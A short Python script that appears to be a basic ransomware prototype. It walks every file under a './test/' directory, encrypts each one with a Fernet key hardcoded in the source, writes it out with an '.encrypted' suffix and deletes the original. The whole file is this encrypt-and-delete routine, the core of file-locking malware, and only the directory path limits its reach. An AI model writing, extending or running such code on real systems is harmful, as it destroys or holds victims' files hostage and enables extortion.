import cryptography
from cryptography.fernet import Fernet
import os

key ="ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg="

def encrypt(x):
    input_file =x
    output_file =x+'.encrypted'
    with open(input_file,'rb')as f:
        data =f.read()

    fernet =Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(output_file,'wb') as f:
        f.write(encrypted)


for r,d,f in os.walk("./test/"):
    for x in f:
        encrypt(os.path.join(r,x));os.remove(os.path.join(r,x))